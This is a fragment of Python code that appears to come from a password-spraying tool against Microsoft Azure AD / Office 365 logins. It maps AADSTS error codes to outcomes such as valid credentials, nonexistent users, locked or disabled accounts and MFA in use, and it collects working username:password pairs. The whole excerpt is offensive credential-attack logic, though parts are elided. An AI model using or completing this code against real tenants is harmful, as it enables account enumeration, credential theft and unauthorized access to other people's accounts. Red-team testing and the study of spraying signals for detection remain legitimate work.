...
def msol_authenticate(username, password, url, verbose):
    ...
    if r.status_code == 200:
        print(f"SUCCESS! {r.status_code} {username} : {password}")
        ...
        if "AADSTS50126" in error:
            if verbose:
                print(f"VERBOSE: {r.status_code} Invalid username or password. Username: {username} could exist.")

        elif "AADSTS50128" in error or "AADSTS50059" in error:
            print(f"WARNING! {r.status_code} Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")

        elif "AADSTS50034" in error:
            print(f"WARNING! {r.status_code} The user {username} doesn't exist.")

        elif "AADSTS50079" in error or "AADSTS50076" in error:
            # Microsoft MFA response
            print(f"SUCCESS! {r.status_code} {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
            results += f"{username} : {password}\n"
            ...
            print(f"SUCCESS! {r.status_code} {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
            results += f"{username} : {password}\n"

        elif "AADSTS50053" in error:
            # Locked out account or Smart Lockout in place
            print(f"WARNING! {r.status_code} The account {username} appears to be locked.")
            lockout_counter += 1

        elif "AADSTS50057" in error:
            # Disabled account
            print(f"WARNING! {r.status_code} The account {username} appears to be disabled.")

        elif "AADSTS50055" in error:
            # User password is expired
            print(f"SUCCESS! {r.status_code} {username} : {password} - NOTE: The user's password is expired.")
            results += f"{username} : {password}\n"

        else:
            # Unknown errors
            print(f"{r.status_code} Got an error we haven't seen yet for user {username}")
            print(error)
